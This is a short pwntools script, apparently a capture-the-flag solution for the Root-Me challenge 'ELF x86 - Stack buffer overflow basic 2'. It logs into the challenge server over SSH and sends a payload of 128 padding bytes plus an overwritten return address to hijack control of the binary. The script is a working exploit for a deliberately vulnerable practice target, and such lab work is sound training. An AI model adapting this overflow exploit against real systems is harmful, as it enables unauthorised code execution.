# Root-Me: ELF x86 - Stack buffer overflow basic 2
# woanmeo11

from pwn import *

user = passwd = 'app-systeme-ch15'
r = ssh(host='challenge02.root-me.org', port=2222, user=user, password=passwd)
r = r.process('ch15')

payload = b'a'*128 + p32(0x08048516)

r.sendline(payload)
r.interactive()
